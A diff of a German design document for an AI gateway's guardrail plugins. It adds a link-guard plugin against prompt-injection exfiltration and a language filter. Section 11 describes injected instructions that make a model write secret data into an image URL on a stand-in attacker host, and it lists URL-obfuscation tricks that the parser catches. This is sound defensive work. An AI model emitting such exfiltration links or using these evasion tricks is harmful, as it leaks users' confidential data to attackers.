@@ -3,7 +3,7 @@
 Stand: 2026-11-19 · Status: umgesetzt (Entwurf zur Durchsicht),
 Grundlage: [01-architektur.md](01-architektur.md) §9, [12-plugins.md](12-plugins.md),
 [07-beobachtung.md](07-beobachtung.md) §5 · Code: `crates/aigw-pii`,
-`crates/aigw-plugins/src/builtin/{pii,prompt_filter,content_safety}.rs`,
+`crates/aigw-plugins/src/builtin/{pii,prompt_filter,content_safety,link_guard,language}.rs`,
 `crates/aigw-proxy/src/guard_host.rs`
 
 ## 1. Überblick
@@ -14,6 +14,8 @@ Grundlage: [01-architektur.md](01-architektur.md) §9, [12-plugins.md](12-plugin
 | `prompt-filter` | Anfrage; Wort-/Regex-Regeln wahlweise Antwort, Stream (AIGW-111) | Wort-/Phrasenlisten, Regex-Regeln, Prompt-Injection-Heuristik, Längen-/Anzahl-Grenzen, unsichtbare Unicode-Zeichen (AIGW-109) |
 | `prompt-leak` | Anfrage, Antwort, Stream (AIGW-112) | System-Prompt-Leck: Canary-Token im System-Prompt, optional wörtliche Auszüge (N-Gramme) |
 | `content-safety` | Anfrage, Antwort (gepuffert), Stream (satzweise) | externe Prüfung: Azure AI Content Safety, OpenAI Moderation, Prüfmodell (Llama Guard o. ä.) über eine Modellgruppe des Gateways |
+| `link-guard` (§11) | Antwort, Stream (optional Anfrage) | Datenabfluss über Links/Bilder verhindern (Prompt-Injection-Exfiltration): fremde Bilder entfernen, Links/Query-Parameter/lange Pfade je Konfiguration |
+| `language` (§12) | Anfrage (optional Antwort, Stream) | erlaubte/gesperrte Sprachen (ISO 639-1), Erkennung mit `whatlang` |
 
 Alle drei sind normale Plugins der Kette (Bindungen, Vererbung, `order`, `failMode`,
 `timeoutMs` wie in [12-plugins.md](12-plugins.md) §4). Typische Reihenfolge über `order`:
@@ -565,7 +567,7 @@ optionale Payload-Logging-Obergrenze. Inhaltliche Änderungen erhöhen `version`
 | Profil | Bindungen | Payload-Logging |
 |---|---|---|
 | **Basis** (v2) | `prompt-filter` (Order 10): Injection-Heuristik Schwelle 1,0 → reject, Grenzen 200 Nachrichten / 400 000 Zeichen / 100 000 je Nachricht, unsichtbare Zeichen → **strip**. `pii` (Order 20): `mask`, `both` für `email`, `phone`, `iban`, `creditCard`, `apiKey`, `urlCredentials` | unverändert |
-| **Streng** (v2) | `prompt-filter` (gesperrt): Schwelle 0,8, Grenzen 100 / 200 000 / 50 000, unsichtbare Zeichen → **reject**. `prompt-leak` (Order 90, gesperrt): Canary `block`, `rotation: stable` (Prompt-Caching der Anbieter bleibt wirksam). `pii` (gesperrt): `creditCard`, `apiKey`, `urlCredentials` → **reject**; `email`, `phone`, `iban`, `taxIdDe`, `socialSecurityDe`, `idCardDe`, `passportDe` → mask. Optional `content-safety` (Order 30, `direction: both`, `outputMode: buffered`, `failMode: closed`, 3000 ms) – nur mit Angaben beim Anwenden | `payloadModeMax: masked` |
+| **Streng** (v3) | `prompt-filter` (gesperrt): Schwelle 0,8, Grenzen 100 / 200 000 / 50 000, unsichtbare Zeichen → **reject**. `prompt-leak` (Order 90, gesperrt): Canary `block`, `rotation: stable` (Prompt-Caching der Anbieter bleibt wirksam). `pii` (gesperrt): `creditCard`, `apiKey`, `urlCredentials` → **reject**; `email`, `phone`, `iban`, `taxIdDe`, `socialSecurityDe`, `idCardDe`, `passportDe` → mask. `link-guard` (Order 25, gesperrt, AIGW-110): Bilder zu fremden Domains entfernen (`images: block`, `links: allow`, `strip`). Optional `content-safety` (Order 30, `direction: both`, `outputMode: buffered`, `failMode: closed`, 3000 ms) – nur mit Angaben beim Anwenden | `payloadModeMax: masked` |
 | **Offen** | `prompt-filter`: nur Grenzen 500 / 1 000 000 / 400 000 | `payloadModeMax: metadata` (kein Inhalt) |
 
 **Admin-API:**
@@ -615,3 +617,122 @@ läuft – Routing, Retries und Entra-Auth übernimmt dann das Gateway.
 - Exakter Cache meldete `bypass`: Anfragen ohne `temperature: 0` (siehe
   [14-cache.md](14-cache.md), neuer Header `x-aigw-cache-reason: temperature`); mit `pii` +
   `prompt-filter` und `temperature: 0` trifft der Cache.
+
+## 11. Plugin `link-guard` (AIGW-110)
+
+**Bedrohung:** Eine eingeschleuste Anweisung (z. B. in einem Tool-Ergebnis, einer Webseite oder
+einem Dokument) bringt das Modell dazu, vertrauliche Daten in eine URL zu schreiben –
+typisch `![](https://angreifer.example/p.png?d=<Daten>)`. Der Chat-Client lädt das Bild beim
+Rendern **ohne Klick**, die Daten landen im Log des Angreifers. Links brauchen einen Klick, sind
+aber ebenfalls ein Kanal. `link-guard` prüft deshalb die Ausgabe auf URLs und entfernt bzw.
+entschärft alles, was zu nicht vertrauenswürdigen Domains führt.
+
+```yaml
+plugin: link-guard
+config:
+  allowDomains: [docs.example.com, "*.cdn.example.com"]   # Subdomain-Wildcard; Domain selbst separat
+  images: block            # block (Standard) | allow – Bilder zu fremden Domains
+  links: allow             # allow (Standard) | block – Links zu fremden Domains
+  blockQueryParams: false  # fremde URLs mit Query-Parametern oder user@host blockieren
+  maxPathLength: 100       # fremde URLs mit längerem Pfad blockieren (optional, 1–8192)
+  action: strip            # strip (Standard) | defang | reject | flag
+  direction: output        # output (Standard) | input | both
+  roles: [tool]            # Eingabe: geprüfte Rollen (Standard: Tool-Ergebnisse)
+  streamMaxHoldBytes: 8192 # Stream: unvollständige Konstrukte höchstens so lange zurückhalten
+```
+
+**Erkannt** (Kategorie in Zählern/Metrik):
+
+| Form | Art | Beispiel |
+|---|---|---|
+| Markdown-Bild, auch in Linktexten verschachtelt | Bild | `![x](https://e.example/p.png "t")`, `![x](<url mit leerzeichen>)` |
+| Markdown-Link | Link | `[Text](https://e.example/a)` |
+| Referenz-Definition | **Bild** (jede Definition ist als `![x][ref]` verwendbar) | `[ref]: https://e.example/p.png` |
+| HTML-Tag | Bild bei automatisch geladenen Attributen (`src`, `srcset`, `poster`, `background`, `data`, `href` an `link`/`base`, CSS `url()` in `style`, `<meta http-equiv=refresh>`), Link bei `<a>`/`<area href>`, `action`, `formaction`, `ping` | `<img alt="a>b" src=…>` (Anführungszeichen beachtet) |
+| nackte URL | Link | `https://…`, `www.…`, `(//host/…)` |
+
+Kategorien: `image`, `link`, `query` (Query-Parameter oder Zugangsdaten bei
+`blockQueryParams`), `path` (`maxPathLength`), `scheme` (`javascript:`/`vbscript:` – immer
+verboten). Erlaubte Domains werden nicht weiter geprüft. Relative Ziele (`/bild.png`, `#a`)
+und `data:`-Bilder haben kein fremdes Ziel und bleiben; andere Schemata (`mailto:` …) gelten als
+fremd ohne Host.
+
+**URL-Analyse wie im Browser (konservativ):** HTML-Entities (`https&#58;//`), `\` wie `/`,
+Tab/Zeilenumbruch entfernt, beliebig viele Schrägstriche nach dem Schema (`https:evil.test`,
+`https:/\evil.test`), Zugangsdaten vor dem letzten `@` (`https://erlaubt.example@evil.test`),
+Port, Prozent-Kodierung und ideografische Punkte im Host, Groß-/Kleinschreibung, Punkt am Ende.
+Wildcards gelten nur an Label-Grenzen (`*.example.com` passt nicht auf `evil-example.com` und
+nicht auf `example.com` selbst).
+
+**Aktionen:** `strip` entfernt Bilder, Tags, Referenz-Definitionen und nackte URLs ganz; bei
+Markdown-Links bleibt der Linktext. `defang` ersetzt sie durch einen nicht klickbaren
+Platzhalter mit entschärftem Host (`[blocked image: evil[.]test]`, Link: `Text [blocked link:
+evil[.]test]`). `reject` blockiert wie F160 (Ausgabe `200` mit `content_filter`/`refusal`, Header
+`x-aigw-guardrail: link-guard`; Eingabe `400 link_blocked`), `flag` zählt nur. Die Meldung nennt
+die Regel, nie die URL. Nach dem Entfernen wird **bis zum Fixpunkt neu geprüft** (höchstens 8
+Durchläufe, sonst wird der ganze Text ersetzt) – sonst ließe sich z. B. aus
+`<im<img src=a>g src=b>` oder `!<img …>[x](url)` durch das Entfernen ein neues Bild bauen.
+
+**Stream:** Text wird gepuffert, solange am Ende ein Konstrukt unvollständig sein kann: offene
+`[` im aktuellen Absatz, `]` oder `!` am Ende, unvollständiges Markdown-Ziel, HTML-Tag ohne `>`,
+Referenz-Definition ohne Ziel, nackte URL bis zum Pufferende oder ein möglicher URL-Anfang
+(`htt`, `www`, `(/`). Alles davor wird geprüft und sofort ausgegeben – ein über Chunk-Grenzen
+geteilter Link wird also nie stückweise ausgegeben. Auch das **Ergebnis** darf nicht mit einem
+offenen Konstrukt enden (z. B. `!` vor einem entfernten Tag), sonst könnte das nächste Stück ein
+Bild bilden; so ein Rest wandert zurück in den Puffer. Wächst der Puffer über
+`streamMaxHoldBytes`, wird alles geprüft und ausgegeben; ein Host, der bis ans Pufferende reicht,
+gilt dann als fremd. Tool-Argumente und Reasoning bleiben unverändert (werden nicht gerendert;
+Reasoning ist signiert).
+
+**Eingabe (`direction: input|both`):** prüft Text der gewählten Rollen; mit `tool` (Standard)
+auch `tool_result`-Teile in Nutzernachrichten (Anthropic). Nutzen: eingeschleuste
+Bild-Vorlagen gar nicht erst ans Modell geben bzw. mit `flag` sichtbar machen. Die Ausgabe-Prüfung
+bleibt der eigentliche Schutz.
+
+**Grenzen:** Code-Blöcke werden nicht ausgenommen (auch dort werden Links entfernt); Kanäle ohne
+URL-Syntax (z. B. Daten im Subdomain-Namen eines **erlaubten** Links) erkennt das Plugin nicht;
+Clients, die Text außerhalb von Markdown/HTML zu Links machen, sind nur über nackte URLs
+abgedeckt.
+
+## 12. Plugin `language` (AIGW-114)
+
+```yaml
+plugin: language
+config:
+  allow: [de, en]          # nur diese Sprachen (ISO 639-1); leer = alle außer deny
+  deny: [ru]               # diese nicht
+  action: reject           # reject (Standard) | flag
+  direction: input         # input (Standard) | output | both
+  roles: [user]            # geprüfte Rollen (Standard: user)
+  minChars: 20             # Mindestzahl Buchstaben; kürzere Texte werden nicht geprüft
+  minConfidence: 0.5       # unsicherere Erkennungen gelten als erlaubt (0–1)
+  streamSampleChars: 200   # Ausgabe im Stream: so viel Text zurückhalten, dann entscheiden
+```
+
+- **Erkennung:** Crate `whatlang` 0.16 (MIT, Trigramme + Schrifterkennung, 69 Sprachen, keine
+  Modelle/Dateien, keine neuen transitiven Abhängigkeiten im Lockfile). Abgewogen gegen eine
+  eigene Implementierung: gleicher Ansatz, aber `whatlang` bringt gepflegte Trigramm-Profile für
+  69 Sprachen mit; eine eigene Variante hätte nur wenige Sprachen in schlechterer Qualität
+  abgedeckt. Codes werden auf ISO 639-1 abgebildet (`zh` = Mandarin, `fa` = Persisch,
+  `nb`/`no` = Bokmål); unbekannte Codes sind ein Konfigurationsfehler (`422`) mit der Liste der
+  unterstützten.
+- **Je Nachricht** der gewählten Rollen (Text-/Ablehnungsteile und Tool-Ergebnisse,
+  Stichprobe der ersten 2000 Zeichen); bei gemischten Texten zählt die überwiegende Sprache. Zu
+  kurze Texte (`minChars` Buchstaben, Ziffern/Satzzeichen zählen nicht) und Erkennungen unter
+  `minConfidence` gelten als erlaubt – eine Sprachregel ist eine Richtlinie, kein
+  Sicherheitsgrenze.
+- **Ablehnung:** Eingabe `400 language_not_allowed` („erkannt: fr“), Header
+  `x-aigw-guardrail: language`; Ausgabe wie F160 (`content_filter`/`refusal`). Zähler und Metrik
+  mit der erkannten Sprache als Kategorie (`aigw_guardrail_hits_total{plugin="language",
+  category="fr",action="reject"}`, höchstens 70 Werte).
+- **Ausgabe im Stream:** Textereignisse werden zurückgehalten, bis `streamSampleChars`
+  Zeichen vorliegen (oder ein anderes Ereignis wie Tool-Aufruf/Ende kommt), dann wird einmal
+  entschieden: erlaubt → alles Zurückgehaltene geht hinaus, danach ungepuffert; nicht erlaubt →
+  sauberer Abbruch mit `content_filter`, nichts vom Text ist hinausgegangen.
+- **Nicht in den Profilen:** Sprachregeln hängen vom Einsatz ab.
+
+**Tests (AIGW-110/114):** `aigw-plugins` (Einheiten: Konfiguration, alle Formen und Tricks,
+Fixpunkt, Stream mit Stückgrößen 1–7 gleich dem Ganztext, Zurückhalten/erzwungene Ausgabe,
+Ablehnung im Stream; Sprachtabelle gegen `whatlang`, Erkennung, allow/deny, Stream-Stichprobe),
+`aigw-proxy/tests/link_language.rs` (beide Eingangsformate, JSON und Stream in 3-Byte-Stücken,
+Zähler im Record, F160), `aigw-admin` (Testlauf, Profil „Streng“), UI-e2e `aigw110.spec.js`.
